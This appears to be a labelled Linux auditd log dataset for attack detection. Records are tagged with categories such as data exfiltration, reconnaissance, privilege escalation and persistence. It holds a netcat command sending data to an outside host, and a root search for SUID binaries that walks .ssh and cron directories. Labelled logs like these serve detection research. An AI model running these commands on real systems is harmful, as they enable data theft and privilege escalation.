DATA EXFILTRATION,type=PROCTITLE,msg=audit(12/03/2025 03:25:27.530:14563),proctitle=nc -w 3 remotehost 1234
RECONNAISSANCE,type=PATH,msg=audit(12/03/2025 10:11:34.005:25776),item=0,name=/usr/bin/find,inode=1835744,dev=08:02,mode=file,755,ouid=root,ogid=root,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
RECONNAISSANCE,type=CWD,msg=audit(12/03/2025 10:11:34.005:25776),cwd=/home/ubuntu
RECONNAISSANCE,type=EXECVE,msg=audit(12/03/2025 10:11:34.005:25776),argc=6,a0=find,a1=/,a2=-type,a3=f,a4=-perm,a5=-4000
RECONNAISSANCE,type=SYSCALL,msg=audit(12/03/2025 10:11:34.005:25776),arch=x86_64,syscall=execve,success=yes,exit=0,a0=0x5eaec880c1c0,a1=0x5eaec8813dd0,a2=0x5eaec8809400,a3=0x5eaec8818d20,items=2,ppid=28139,pid=48420,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=find,exe=/usr/bin/find,subj=unconfined,key=RECONNAISSANCE
RECONNAISSANCE,type=PROCTITLE,msg=audit(12/03/2025 10:11:34.179:25777),proctitle=find / -type f -perm -4000
RECONNAISSANCE,type=PATH,msg=audit(12/03/2025 10:11:34.179:25777),item=0,name=cron.d,inode=2097184,dev=08:02,mode=dir,755,ouid=root,ogid=root,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
RECONNAISSANCE,type=CWD,msg=audit(12/03/2025 10:11:34.179:25777),cwd=/home/ubuntu
RECONNAISSANCE,type=SYSCALL,msg=audit(12/03/2025 10:11:34.179:25777),arch=x86_64,syscall=openat,success=yes,exit=6,a0=0x7,a1=0x6452edff2ba0,a2=O_RDONLY|O_NOCTTY|O_NONBLOCK|O_DIRECTORY|O_NOFOLLOW|O_CLOEXEC,a3=0x0,items=1,ppid=28139,pid=48420,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=find,exe=/usr/bin/find,subj=unconfined,key=PERSISTENCE
RECONNAISSANCE,type=PROCTITLE,msg=audit(12/03/2025 10:11:49.147:25778),proctitle=find / -type f -perm -4000
RECONNAISSANCE,type=PATH,msg=audit(12/03/2025 10:11:49.147:25778),item=0,name=root,inode=917505,dev=08:02,mode=dir,700,ouid=root,ogid=root,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
RECONNAISSANCE,type=CWD,msg=audit(12/03/2025 10:11:49.147:25778),cwd=/home/ubuntu
RECONNAISSANCE,type=SYSCALL,msg=audit(12/03/2025 10:11:49.147:25778),arch=x86_64,syscall=openat,success=yes,exit=6,a0=0x5,a1=0x6452edfe2c40,a2=O_RDONLY|O_NOCTTY|O_NONBLOCK|O_DIRECTORY|O_NOFOLLOW|O_CLOEXEC,a3=0x0,items=1,ppid=28139,pid=48420,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=find,exe=/usr/bin/find,subj=unconfined,key=PRIVILEGE_ESCALATION
RECONNAISSANCE,type=PROCTITLE,msg=audit(12/03/2025 10:11:49.149:25779),proctitle=find / -type f -perm -4000
RECONNAISSANCE,type=PATH,msg=audit(12/03/2025 10:11:49.149:25779),item=0,name=.local,inode=917530,dev=08:02,mode=dir,755,ouid=root,ogid=root,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
RECONNAISSANCE,type=CWD,msg=audit(12/03/2025 10:11:49.149:25779),cwd=/home/ubuntu
RECONNAISSANCE,type=SYSCALL,msg=audit(12/03/2025 10:11:49.149:25779),arch=x86_64,syscall=openat,success=yes,exit=6,a0=0x7,a1=0x6452edfda9a0,a2=O_RDONLY|O_NOCTTY|O_NONBLOCK|O_DIRECTORY|O_NOFOLLOW|O_CLOEXEC,a3=0x0,items=1,ppid=28139,pid=48420,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=find,exe=/usr/bin/find,subj=unconfined,key=PRIVILEGE_ESCALATION
RECONNAISSANCE,type=PROCTITLE,msg=audit(12/03/2025 10:11:49.150:25780),proctitle=find / -type f -perm -4000
RECONNAISSANCE,type=PATH,msg=audit(12/03/2025 10:11:49.150:25780),item=0,name=share,inode=917531,dev=08:02,mode=dir,700,ouid=root,ogid=root,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
RECONNAISSANCE,type=CWD,msg=audit(12/03/2025 10:11:49.150:25780),cwd=/home/ubuntu
RECONNAISSANCE,type=SYSCALL,msg=audit(12/03/2025 10:11:49.150:25780),arch=x86_64,syscall=openat,success=yes,exit=6,a0=0x8,a1=0x6452edfd9e50,a2=O_RDONLY|O_NOCTTY|O_NONBLOCK|O_DIRECTORY|O_NOFOLLOW|O_CLOEXEC,a3=0x0,items=1,ppid=28139,pid=48420,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=find,exe=/usr/bin/find,subj=unconfined,key=PRIVILEGE_ESCALATION
RECONNAISSANCE,type=PROCTITLE,msg=audit(12/03/2025 10:11:49.150:25781),proctitle=find / -type f -perm -4000
RECONNAISSANCE,type=PATH,msg=audit(12/03/2025 10:11:49.150:25781),item=0,name=nano,inode=917532,dev=08:02,mode=dir,700,ouid=root,ogid=root,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
RECONNAISSANCE,type=CWD,msg=audit(12/03/2025 10:11:49.150:25781),cwd=/home/ubuntu
RECONNAISSANCE,type=SYSCALL,msg=audit(12/03/2025 10:11:49.150:25781),arch=x86_64,syscall=openat,success=yes,exit=6,a0=0x9,a1=0x6452edfd9590,a2=O_RDONLY|O_NOCTTY|O_NONBLOCK|O_DIRECTORY|O_NOFOLLOW|O_CLOEXEC,a3=0x0,items=1,ppid=28139,pid=48420,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=find,exe=/usr/bin/find,subj=unconfined,key=PRIVILEGE_ESCALATION
RECONNAISSANCE,type=PROCTITLE,msg=audit(12/03/2025 10:11:49.153:25782),proctitle=find / -type f -perm -4000
RECONNAISSANCE,type=PATH,msg=audit(12/03/2025 10:11:49.153:25782),item=0,name=snap,inode=917510,dev=08:02,mode=dir,700,ouid=root,ogid=root,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
RECONNAISSANCE,type=CWD,msg=audit(12/03/2025 10:11:49.153:25782),cwd=/home/ubuntu
RECONNAISSANCE,type=SYSCALL,msg=audit(12/03/2025 10:11:49.153:25782),arch=x86_64,syscall=openat,success=yes,exit=6,a0=0x7,a1=0x6452edfdaf30,a2=O_RDONLY|O_NOCTTY|O_NONBLOCK|O_DIRECTORY|O_NOFOLLOW|O_CLOEXEC,a3=0x0,items=1,ppid=28139,pid=48420,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=find,exe=/usr/bin/find,subj=unconfined,key=PRIVILEGE_ESCALATION
RECONNAISSANCE,type=PROCTITLE,msg=audit(12/03/2025 10:11:49.153:25783),proctitle=find / -type f -perm -4000
RECONNAISSANCE,type=PATH,msg=audit(12/03/2025 10:11:49.153:25783),item=0,name=firefox,inode=917511,dev=08:02,mode=dir,755,ouid=root,ogid=root,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
RECONNAISSANCE,type=CWD,msg=audit(12/03/2025 10:11:49.153:25783),cwd=/home/ubuntu
RECONNAISSANCE,type=SYSCALL,msg=audit(12/03/2025 10:11:49.153:25783),arch=x86_64,syscall=openat,success=yes,exit=6,a0=0x8,a1=0x6452edfd9590,a2=O_RDONLY|O_NOCTTY|O_NONBLOCK|O_DIRECTORY|O_NOFOLLOW|O_CLOEXEC,a3=0x0,items=1,ppid=28139,pid=48420,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=find,exe=/usr/bin/find,subj=unconfined,key=PRIVILEGE_ESCALATION
RECONNAISSANCE,type=PROCTITLE,msg=audit(12/03/2025 10:11:49.153:25784),proctitle=find / -type f -perm -4000
RECONNAISSANCE,type=PATH,msg=audit(12/03/2025 10:11:49.153:25784),item=0,name=6836,inode=917512,dev=08:02,mode=dir,755,ouid=root,ogid=root,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
RECONNAISSANCE,type=CWD,msg=audit(12/03/2025 10:11:49.153:25784),cwd=/home/ubuntu
RECONNAISSANCE,type=SYSCALL,msg=audit(12/03/2025 10:11:49.153:25784),arch=x86_64,syscall=openat,success=yes,exit=6,a0=0x9,a1=0x6452edff4350,a2=O_RDONLY|O_NOCTTY|O_NONBLOCK|O_DIRECTORY|O_NOFOLLOW|O_CLOEXEC,a3=0x0,items=1,ppid=28139,pid=48420,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=find,exe=/usr/bin/find,subj=unconfined,key=PRIVILEGE_ESCALATION
RECONNAISSANCE,type=PROCTITLE,msg=audit(12/03/2025 10:11:49.154:25785),proctitle=find / -type f -perm -4000
RECONNAISSANCE,type=PATH,msg=audit(12/03/2025 10:11:49.154:25785),item=0,name=common,inode=917513,dev=08:02,mode=dir,755,ouid=root,ogid=root,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
RECONNAISSANCE,type=CWD,msg=audit(12/03/2025 10:11:49.154:25785),cwd=/home/ubuntu
RECONNAISSANCE,type=SYSCALL,msg=audit(12/03/2025 10:11:49.154:25785),arch=x86_64,syscall=openat,success=yes,exit=6,a0=0x9,a1=0x6452edff40a0,a2=O_RDONLY|O_NOCTTY|O_NONBLOCK|O_DIRECTORY|O_NOFOLLOW|O_CLOEXEC,a3=0x0,items=1,ppid=28139,pid=48420,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=find,exe=/usr/bin/find,subj=unconfined,key=PRIVILEGE_ESCALATION
RECONNAISSANCE,type=PROCTITLE,msg=audit(12/03/2025 10:11:49.154:25786),proctitle=find / -type f -perm -4000
RECONNAISSANCE,type=PATH,msg=audit(12/03/2025 10:11:49.154:25786),item=0,name=6782,inode=917537,dev=08:02,mode=dir,755,ouid=root,ogid=root,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
RECONNAISSANCE,type=CWD,msg=audit(12/03/2025 10:11:49.154:25786),cwd=/home/ubuntu
RECONNAISSANCE,type=SYSCALL,msg=audit(12/03/2025 10:11:49.154:25786),arch=x86_64,syscall=openat,success=yes,exit=6,a0=0x9,a1=0x6452edfee950,a2=O_RDONLY|O_NOCTTY|O_NONBLOCK|O_DIRECTORY|O_NOFOLLOW|O_CLOEXEC,a3=0x0,items=1,ppid=28139,pid=48420,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=find,exe=/usr/bin/find,subj=unconfined,key=PRIVILEGE_ESCALATION
RECONNAISSANCE,type=PROCTITLE,msg=audit(12/03/2025 10:11:49.155:25787),proctitle=find / -type f -perm -4000
RECONNAISSANCE,type=PATH,msg=audit(12/03/2025 10:11:49.155:25787),item=0,name=snapd-desktop-integration,inode=917524,dev=08:02,mode=dir,755,ouid=root,ogid=root,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
RECONNAISSANCE,type=CWD,msg=audit(12/03/2025 10:11:49.155:25787),cwd=/home/ubuntu
RECONNAISSANCE,type=SYSCALL,msg=audit(12/03/2025 10:11:49.155:25787),arch=x86_64,syscall=openat,success=yes,exit=6,a0=0x8,a1=0x6452edfee820,a2=O_RDONLY|O_NOCTTY|O_NONBLOCK|O_DIRECTORY|O_NOFOLLOW|O_CLOEXEC,a3=0x0,items=1,ppid=28139,pid=48420,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=find,exe=/usr/bin/find,subj=unconfined,key=PRIVILEGE_ESCALATION
RECONNAISSANCE,type=PROCTITLE,msg=audit(12/03/2025 10:11:49.156:25788),proctitle=find / -type f -perm -4000
RECONNAISSANCE,type=PATH,msg=audit(12/03/2025 10:11:49.156:25788),item=0,name=common,inode=917526,dev=08:02,mode=dir,755,ouid=root,ogid=root,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
RECONNAISSANCE,type=CWD,msg=audit(12/03/2025 10:11:49.156:25788),cwd=/home/ubuntu
RECONNAISSANCE,type=SYSCALL,msg=audit(12/03/2025 10:11:49.156:25788),arch=x86_64,syscall=openat,success=yes,exit=6,a0=0x9,a1=0x6452edfd9590,a2=O_RDONLY|O_NOCTTY|O_NONBLOCK|O_DIRECTORY|O_NOFOLLOW|O_CLOEXEC,a3=0x0,items=1,ppid=28139,pid=48420,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=find,exe=/usr/bin/find,subj=unconfined,key=PRIVILEGE_ESCALATION
RECONNAISSANCE,type=PROCTITLE,msg=audit(12/03/2025 10:11:49.156:25789),proctitle=find / -type f -perm -4000
RECONNAISSANCE,type=PATH,msg=audit(12/03/2025 10:11:49.156:25789),item=0,name=315,inode=917525,dev=08:02,mode=dir,755,ouid=root,ogid=root,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
RECONNAISSANCE,type=CWD,msg=audit(12/03/2025 10:11:49.156:25789),cwd=/home/ubuntu
RECONNAISSANCE,type=SYSCALL,msg=audit(12/03/2025 10:11:49.156:25789),arch=x86_64,syscall=openat,success=yes,exit=6,a0=0x9,a1=0x6452edfee950,a2=O_RDONLY|O_NOCTTY|O_NONBLOCK|O_DIRECTORY|O_NOFOLLOW|O_CLOEXEC,a3=0x0,items=1,ppid=28139,pid=48420,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=find,exe=/usr/bin/find,subj=unconfined,key=PRIVILEGE_ESCALATION
RECONNAISSANCE,type=PROCTITLE,msg=audit(12/03/2025 10:11:49.157:25790),proctitle=find / -type f -perm -4000
RECONNAISSANCE,type=PROCTITLE,msg=audit(12/03/2025 10:11:49.157:25791),proctitle=find / -type f -perm -4000
RECONNAISSANCE,type=PATH,msg=audit(12/03/2025 10:11:49.157:25791),item=0,name=common,inode=917518,dev=08:02,mode=dir,755,ouid=root,ogid=root,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
RECONNAISSANCE,type=CWD,msg=audit(12/03/2025 10:11:49.157:25791),cwd=/home/ubuntu
RECONNAISSANCE,type=SYSCALL,msg=audit(12/03/2025 10:11:49.157:25791),arch=x86_64,syscall=openat,success=yes,exit=6,a0=0x9,a1=0x6452edfe0320,a2=O_RDONLY|O_NOCTTY|O_NONBLOCK|O_DIRECTORY|O_NOFOLLOW|O_CLOEXEC,a3=0x0,items=1,ppid=28139,pid=48420,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=find,exe=/usr/bin/find,subj=unconfined,key=PRIVILEGE_ESCALATION
RECONNAISSANCE,type=PROCTITLE,msg=audit(12/03/2025 10:11:49.157:25792),proctitle=find / -type f -perm -4000
RECONNAISSANCE,type=PATH,msg=audit(12/03/2025 10:11:49.157:25792),item=0,name=167,inode=917517,dev=08:02,mode=dir,755,ouid=root,ogid=root,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
RECONNAISSANCE,type=CWD,msg=audit(12/03/2025 10:11:49.157:25792),cwd=/home/ubuntu
RECONNAISSANCE,type=SYSCALL,msg=audit(12/03/2025 10:11:49.157:25792),arch=x86_64,syscall=openat,success=yes,exit=6,a0=0x9,a1=0x6452edfee950,a2=O_RDONLY|O_NOCTTY|O_NONBLOCK|O_DIRECTORY|O_NOFOLLOW|O_CLOEXEC,a3=0x0,items=1,ppid=28139,pid=48420,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=find,exe=/usr/bin/find,subj=unconfined,key=PRIVILEGE_ESCALATION
RECONNAISSANCE,type=PROCTITLE,msg=audit(12/03/2025 10:11:49.158:25793),proctitle=find / -type f -perm -4000
RECONNAISSANCE,type=PATH,msg=audit(12/03/2025 10:11:49.158:25793),item=0,name=snap-store,inode=917520,dev=08:02,mode=dir,755,ouid=root,ogid=root,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
RECONNAISSANCE,type=CWD,msg=audit(12/03/2025 10:11:49.158:25793),cwd=/home/ubuntu
RECONNAISSANCE,type=SYSCALL,msg=audit(12/03/2025 10:11:49.158:25793),arch=x86_64,syscall=openat,success=yes,exit=6,a0=0x8,a1=0x6452edfe2120,a2=O_RDONLY|O_NOCTTY|O_NONBLOCK|O_DIRECTORY|O_NOFOLLOW|O_CLOEXEC,a3=0x0,items=1,ppid=28139,pid=48420,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=find,exe=/usr/bin/find,subj=unconfined,key=PRIVILEGE_ESCALATION
RECONNAISSANCE,type=PROCTITLE,msg=audit(12/03/2025 10:11:49.158:25794),proctitle=find / -type f -perm -4000
RECONNAISSANCE,type=PATH,msg=audit(12/03/2025 10:11:49.158:25794),item=0,name=common,inode=917522,dev=08:02,mode=dir,755,ouid=root,ogid=root,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
RECONNAISSANCE,type=CWD,msg=audit(12/03/2025 10:11:49.158:25794),cwd=/home/ubuntu
RECONNAISSANCE,type=SYSCALL,msg=audit(12/03/2025 10:11:49.158:25794),arch=x86_64,syscall=openat,success=yes,exit=6,a0=0x9,a1=0x6452edfd9590,a2=O_RDONLY|O_NOCTTY|O_NONBLOCK|O_DIRECTORY|O_NOFOLLOW|O_CLOEXEC,a3=0x0,items=1,ppid=28139,pid=48420,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=find,exe=/usr/bin/find,subj=unconfined,key=PRIVILEGE_ESCALATION
RECONNAISSANCE,type=PROCTITLE,msg=audit(12/03/2025 10:11:49.159:25795),proctitle=find / -type f -perm -4000
RECONNAISSANCE,type=PATH,msg=audit(12/03/2025 10:11:49.159:25795),item=0,name=1270,inode=917521,dev=08:02,mode=dir,755,ouid=root,ogid=root,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
RECONNAISSANCE,type=CWD,msg=audit(12/03/2025 10:11:49.159:25795),cwd=/home/ubuntu
RECONNAISSANCE,type=SYSCALL,msg=audit(12/03/2025 10:11:49.159:25795),arch=x86_64,syscall=openat,success=yes,exit=6,a0=0x9,a1=0x6452edfe0320,a2=O_RDONLY|O_NOCTTY|O_NONBLOCK|O_DIRECTORY|O_NOFOLLOW|O_CLOEXEC,a3=0x0,items=1,ppid=28139,pid=48420,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=find,exe=/usr/bin/find,subj=unconfined,key=PRIVILEGE_ESCALATION
RECONNAISSANCE,type=PROCTITLE,msg=audit(12/03/2025 10:11:49.159:25796),proctitle=find / -type f -perm -4000
RECONNAISSANCE,type=PATH,msg=audit(12/03/2025 10:11:49.159:25796),item=0,name=.cache,inode=917506,dev=08:02,mode=dir,700,ouid=root,ogid=root,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
RECONNAISSANCE,type=CWD,msg=audit(12/03/2025 10:11:49.159:25796),cwd=/home/ubuntu
RECONNAISSANCE,type=SYSCALL,msg=audit(12/03/2025 10:11:49.159:25796),arch=x86_64,syscall=openat,success=yes,exit=6,a0=0x7,a1=0x6452edfeea60,a2=O_RDONLY|O_NOCTTY|O_NONBLOCK|O_DIRECTORY|O_NOFOLLOW|O_CLOEXEC,a3=0x0,items=1,ppid=28139,pid=48420,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=find,exe=/usr/bin/find,subj=unconfined,key=PRIVILEGE_ESCALATION
RECONNAISSANCE,type=PROCTITLE,msg=audit(12/03/2025 10:11:49.160:25797),proctitle=find / -type f -perm -4000
RECONNAISSANCE,type=PATH,msg=audit(12/03/2025 10:11:49.160:25797),item=0,name=.config,inode=917535,dev=08:02,mode=dir,700,ouid=root,ogid=root,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
RECONNAISSANCE,type=CWD,msg=audit(12/03/2025 10:11:49.160:25797),cwd=/home/ubuntu
RECONNAISSANCE,type=SYSCALL,msg=audit(12/03/2025 10:11:49.160:25797),arch=x86_64,syscall=openat,success=yes,exit=6,a0=0x7,a1=0x6452edfe1d90,a2=O_RDONLY|O_NOCTTY|O_NONBLOCK|O_DIRECTORY|O_NOFOLLOW|O_CLOEXEC,a3=0x0,items=1,ppid=28139,pid=48420,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=find,exe=/usr/bin/find,subj=unconfined,key=PRIVILEGE_ESCALATION
RECONNAISSANCE,type=PROCTITLE,msg=audit(12/03/2025 10:11:49.160:25798),proctitle=find / -type f -perm -4000
RECONNAISSANCE,type=PATH,msg=audit(12/03/2025 10:11:49.160:25798),item=0,name=procps,inode=917536,dev=08:02,mode=dir,700,ouid=root,ogid=root,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
RECONNAISSANCE,type=CWD,msg=audit(12/03/2025 10:11:49.160:25798),cwd=/home/ubuntu
RECONNAISSANCE,type=SYSCALL,msg=audit(12/03/2025 10:11:49.160:25798),arch=x86_64,syscall=openat,success=yes,exit=6,a0=0x8,a1=0x6452edfe0320,a2=O_RDONLY|O_NOCTTY|O_NONBLOCK|O_DIRECTORY|O_NOFOLLOW|O_CLOEXEC,a3=0x0,items=1,ppid=28139,pid=48420,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=find,exe=/usr/bin/find,subj=unconfined,key=PRIVILEGE_ESCALATION
RECONNAISSANCE,type=PROCTITLE,msg=audit(12/03/2025 10:11:49.161:25799),proctitle=find / -type f -perm -4000
RECONNAISSANCE,type=PATH,msg=audit(12/03/2025 10:11:49.161:25799),item=0,name=.ssh,inode=917507,dev=08:02,mode=dir,700,ouid=root,ogid=root,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
RECONNAISSANCE,type=CWD,msg=audit(12/03/2025 10:11:49.161:25799),cwd=/home/ubuntu
RECONNAISSANCE,type=SYSCALL,msg=audit(12/03/2025 10:11:49.161:25799),arch=x86_64,syscall=openat,success=yes,exit=6,a0=0x7,a1=0x6452edfe25d0,a2=O_RDONLY|O_NOCTTY|O_NONBLOCK|O_DIRECTORY|O_NOFOLLOW|O_CLOEXEC,a3=0x0,items=1,ppid=28139,pid=48420,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=find,exe=/usr/bin/find,subj=unconfined,key=PRIVILEGE_ESCALATION
RECONNAISSANCE,type=PROCTITLE,msg=audit(12/03/2025 10:12:03.476:25800),proctitle=find / -type f -perm -4000
RECONNAISSANCE,type=PATH,msg=audit(12/03/2025 10:12:03.476:25800),item=0,name=cron,inode=795721,dev=08:02,mode=dir,755,ouid=root,ogid=root,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
RECONNAISSANCE,type=CWD,msg=audit(12/03/2025 10:12:03.476:25800),cwd=/home/ubuntu
RECONNAISSANCE,type=SYSCALL,msg=audit(12/03/2025 10:12:03.476:25800),arch=x86_64,syscall=openat,success=yes,exit=5,a0=0x7,a1=0x6452edfec760,a2=O_RDONLY|O_NOCTTY|O_NONBLOCK|O_DIRECTORY|O_NOFOLLOW|O_CLOEXEC,a3=0x0,items=1,ppid=28139,pid=48420,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=find,exe=/usr/bin/find,subj=unconfined,key=PERSISTENCE
RECONNAISSANCE,type=PROCTITLE,msg=audit(12/03/2025 10:12:03.476:25801),proctitle=find / -type f -perm -4000
RECONNAISSANCE,type=PATH,msg=audit(12/03/2025 10:12:03.476:25801),item=0,name=crontabs,inode=795725,dev=08:02,mode=dir,sticky,730,ouid=root,ogid=crontab,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
RECONNAISSANCE,type=CWD,msg=audit(12/03/2025 10:12:03.476:25801),cwd=/home/ubuntu
RECONNAISSANCE,type=SYSCALL,msg=audit(12/03/2025 10:12:03.476:25801),arch=x86_64,syscall=openat,success=yes,exit=5,a0=0x8,a1=0x6452edff4c40,a2=O_RDONLY|O_NOCTTY|O_NONBLOCK|O_DIRECTORY|O_NOFOLLOW|O_CLOEXEC,a3=0x0,items=1,ppid=28139,pid=48420,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=find,exe=/usr/bin/find,subj=unconfined,key=PERSISTENCE
RECONNAISSANCE,type=USER_ACCT,msg=audit(12/03/2025 10:12:27.610:25804),pid=48436,uid=root,auid=ubuntu,ses=3,subj=unconfined,op=PAM:accounting,"grantors=pam_permit,pam_localuser",acct=root,exe=/usr/bin/sudo,hostname=?,addr=?,terminal=/dev/pts/5,res=success
RECONNAISSANCE,type=CRED_REFR,msg=audit(12/03/2025 10:12:27.621:25806),pid=48436,uid=root,auid=ubuntu,ses=3,subj=unconfined,op=PAM:setcred,"grantors=pam_permit,pam_cap",acct=root,exe=/usr/bin/sudo,hostname=?,addr=?,terminal=/dev/pts/5,res=success
